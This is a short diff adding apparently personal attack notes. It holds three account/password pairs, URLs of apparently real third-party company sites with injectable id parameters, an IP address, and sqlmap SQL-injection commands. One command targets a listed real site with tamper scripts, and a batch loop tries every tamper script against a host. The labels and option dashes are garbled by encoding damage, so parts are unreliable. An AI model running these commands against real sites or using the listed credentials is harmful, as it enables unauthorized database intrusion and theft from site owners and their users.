@@ -1,0 +1,23 @@
+’À∫≈£∫20173251
+√‹¬Î£∫045707
+
+’À∫≈£∫20174023
+√‹¬Î£∫146618
+
+’À∫≈£∫20173630
+√‹¬Î£∫242820
+http://b2b.hqps.com/1019590_detail.html
+http://www.chinaxinge.com/company/skin/12/index.asp?id=7798
+http://www.scemi.com/ 221.10.182.230 
+sqlmap.py -u http://www.chinaxinge.com/company/skin/12/index.asp?id=7798 -v 3 ®Cdbms °∞MySQL°± ®Ctechnique U -p id ®Cbatch ®Ctamper °∞space2morehash.py°±
+
+python sqlmap.py -u "http://debiandev/sqlmap/mysql/get_int.php?id=1" --batch --banner
+
+
+for /f "delims=" %%i in ('dir /b D:sqlmap	amper*.py') do d:sqlmapsqlmap.py -u "http://192.168.1.100/sql.asp?id=1" --dbs --random-agent --smart --batch --tamper %%i --threads 10
+
+
+
+
+http://www.stronkin.com/en/comphonorbig.asp?id=7
+≤‚ ‘Õ¯’æ£∫http://testasp.vulnweb.com/Login.asp
